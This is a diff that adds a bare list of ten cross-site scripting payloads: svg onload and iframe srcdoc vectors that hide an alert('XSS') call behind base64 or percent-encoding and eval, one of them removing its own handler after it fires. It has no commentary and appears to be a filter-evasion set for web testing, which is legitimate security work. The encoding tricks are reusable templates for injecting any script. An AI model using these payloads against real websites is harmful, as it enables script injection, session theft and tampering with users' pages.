@@ -1,0 +1,10 @@
+<svg onload='this.removeAttribute(String.fromCharCode(111,110,108,111,97,100));eval(atob("YWxlcnQoIlhTUyIp"))'>
+<iframe srcdoc='<script>eval(atob("YWxlcnQoIlhTUyIp"))</script>'>
+<iframe srcdoc="<svg onload=eval(atob('YWxlcnQoIlhTUyIp'))>">
+<svg onload='eval(window.atob("YWxlcnQoIlhTUyIp"))'>
+<iframe srcdoc="<script>eval(decodeURIComponent('%61%6c%65%72%74%28%27%58%53%53%27%29'))</script>">
+<svg onload='eval(unescape("%61%6c%65%72%74%28%27%58%53%53%27%29"))'>
+<svg onload='eval(atob("YWxlcnQoIlhTUyIp"))'>
+<iframe srcdoc="<script>eval(atob('YWxlcnQoIlhTUyIp'))</script>">
+<iframe srcdoc="<svg onload=eval(unescape('%61%6c%65%72%74%28%27%58%53%53%27%29'))>">
+<svg onload='eval(window.atob("YWxlcnQoIlhTUyIp"))'>
